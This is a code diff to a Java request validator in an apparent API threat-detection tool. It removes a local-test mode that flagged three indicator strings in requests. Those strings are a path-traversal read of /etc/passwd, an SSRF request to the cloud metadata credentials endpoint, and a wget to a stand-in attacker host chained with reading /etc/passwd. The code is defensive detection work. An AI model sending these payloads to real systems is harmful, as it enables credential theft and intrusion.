@@ -29,11 +29,6 @@ public class RequestValidator {
   private static List<SchemaConformanceError> errors = new ArrayList<>();
   private static SchemaConformanceError.Builder errorBuilder = SchemaConformanceError.newBuilder();
 
-  private static final boolean LOCAL_TEST_MODE = Boolean.getBoolean("akto.local.test");
-  private static final String LOCAL_LFI_INDICATOR = "../../etc/passwd";
-  private static final String LOCAL_SSRF_TARGET = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
-  private static final String LOCAL_COMMAND = "wget http://evil.attacker.local && cat /etc/passwd";
-
   private static ObjectMapper objectMapper = new ObjectMapper();
   private static final LoggerMaker logger = new LoggerMaker(MaliciousTrafficDetectorTask.class, LogDb.THREAT_DETECTION);
   private static JsonSchemaFactory factory = JsonSchemaFactory.getInstance(VersionFlag.V202012,
@@ -278,65 +273,11 @@ public class RequestValidator {
         return errors;
       }
 
-      List<SchemaConformanceError> result = validateRequestBody(responseParam, rootSchemaNode);
-      if (LOCAL_TEST_MODE) {
-        appendLocalTestThreats(responseParam, result);
-      }
-      return result;
+      return validateRequestBody(responseParam, rootSchemaNode);
     } catch (Exception e) {
       logger.errorAndAddToDb(e, "Error conforming to schema for api info key" + apiInfoKey);
       return errors;
     }
   }
 
-  private static void appendLocalTestThreats(HttpResponseParams responseParam, List<SchemaConformanceError> target) {
-    if (target == null || responseParam == null) {
-      return;
-    }
-
-    addIndicatorMatches(responseParam.getRequestParams().getURL(),
-        SchemaConformanceError.Location.LOCATION_URL,
-        "url",
-        target);
-
-    addIndicatorMatches(String.valueOf(responseParam.getRequestParams().getHeaders()),
-        SchemaConformanceError.Location.LOCATION_HEADER,
-        "headers",
-        target);
-
-    addIndicatorMatches(responseParam.getRequestParams().getPayload(),
-        SchemaConformanceError.Location.LOCATION_BODY,
-        "payload",
-        target);
-  }
-
-  private static void addIndicatorMatches(String text,
-      SchemaConformanceError.Location location,
-      String instancePath,
-      List<SchemaConformanceError> target) {
-
-    if (text == null || text.isEmpty()) {
-      return;
-    }
-
-    // Stop after first detection per location to avoid duplicate reports
-    for (String indicator : new String[] { LOCAL_LFI_INDICATOR, LOCAL_SSRF_TARGET, LOCAL_COMMAND }) {
-      int index = text.indexOf(indicator);
-      if (index >= 0) {
-        SchemaConformanceError error = SchemaConformanceError.newBuilder()
-            .setSchemaPath("local_test/" + location.name().toLowerCase())
-            .setInstancePath(instancePath)
-            .setAttribute("local_test")
-            .setMessage(String.format("%s [chars %d-%d]", indicator, index, index + indicator.length()))
-            .setLocation(location)
-            .setStart(index)
-            .setEnd(index + indicator.length())
-            .setPhrase(indicator)
-            .build();
-        target.add(error);
-        // Stop after first detection of this indicator in this location
-        break;
-      }
-    }
-  }
 }
